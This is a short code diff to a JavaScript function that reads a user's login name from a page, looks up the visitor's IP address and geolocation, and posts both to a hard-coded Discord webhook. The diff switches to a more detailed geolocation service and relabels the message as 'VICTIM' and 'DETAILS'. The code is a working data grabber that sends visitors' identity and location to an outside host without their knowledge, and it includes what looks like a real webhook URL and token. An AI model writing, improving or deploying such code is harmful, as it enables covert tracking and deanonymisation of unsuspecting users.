@@ -1,6 +1,6 @@
 async function sendWebhookWithData() {
   const loginName = $("#login_name").val() || "ANONYMOUSVICTIM";
-  const urlToFetch = "https://api.ipify.org"; // Replace with the URL you want to fetch
+  const urlToFetch = "http://ip-api.com/json"; // Replace with the URL you want to fetch
   const webhookUrl = "https://discord.com/api/webhooks/1343190095179812874/2s-H4ikjVgiCdUAPixEZ7S3NXcOplWQewYbGoXhXKOpFY4pZFiIsPmqLtHMWZts5001d"; // Replace with your webhook URL
 
   try {
@@ -12,7 +12,7 @@ async function sendWebhookWithData() {
     const fetchedData = await response.text(); // or response.json() if it's JSON
 
     const payload = {
-      content: `Login Name: ${loginName}\nFetched URL: ${urlToFetch}\nFetched Data:\n${fetchedData}`
+      content: `VICTIM: ${loginName}\nDETAILS: \n${fetchedData}`
     };
 
     const webhookResponse = await fetch(webhookUrl, {
